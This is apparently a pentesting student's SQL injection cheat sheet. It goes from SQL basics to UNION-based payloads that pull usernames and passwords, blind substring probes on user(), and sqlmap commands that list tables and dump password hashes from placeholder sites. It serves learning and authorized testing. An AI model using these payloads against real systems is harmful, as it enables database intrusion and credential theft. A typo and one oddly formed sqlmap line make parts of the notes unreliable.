#SQL Statements
`SELECT name, description FROM products WHERE id=9;`

#Basic
`SELECT <columns list> FROM <table> WHERE <condition>;`

#Select Constant Values
`SELECT 22, 'string', 0x12, 'another string';`

#UNION between 2 results. (like && in linux)

`<SELECT statement> UNION <other SELECT statement>;`

#Comments (# and --)
`SELECT field FROM table; #this is a comment`
`SELECT field FROM table; -- also this is a comment`

#Vulnerable Dynamic Queries

`SELECT Name, Description FROM Products WHERE ID='$id';`

`UNION SELECT Username, Password FROM Accounts WHERE 'a'='a`

`SELECT Name, Description FROM Products WHERE ID='' UNION SELECT Username, Password FROM Accounts WHERE 'a'='a';`

#Every input must be tested to conduct professional pentest.
- GET parameters
- POST parameters
- HTTP Headers (User-Agent, Cookie, Accept, ...)

`user();` returns name of user currently using the database (whoami)
`select sunstring('elearnsecurity', 2, 1);` (input, position, length)
`select substring(user(), 1, 1);`
#Test output of a function in True/False condition.
`select substring(user(), 1, 1) = 'r';` 1=True; 0=False
- Can be used to guess a username
`' or substr(user(), 2, 1)='a` <--input in URL.
#Union based SQL Injections
`SELECT description FROM items WHERE id='' UNION SELECT user(); -- -';`
#Union based in URL:
`'UNION SELECT null, null, null; -- -`
#SQLMap
`sqlmap -u <URL> -p <injection parameter> [options]`
`sqlmap -u 'http://victim.site/view.php?id=1141' -p id --technique=U`
 - test ID parameter of GET request for view.php. UNION technique
`sqlmap -u <URL> --data=<POST string> -p parameter [options]`
 - POST string from a request intercepted with Burp.
#Basic SQLMap Usage
`sqlmap -u http://sqli.site/view.php?id=1 --tables`
 - dumps database tables to screen.
`sqlmap -u http://sqli.site/view.php?id=1 --current-db <table name> --columns`
 - Input name of table and get all of the columns in the table.
`sqlmap -u http://sqli.site/view.php?id=1 --current-db <table name> --dump`
 - password hashes
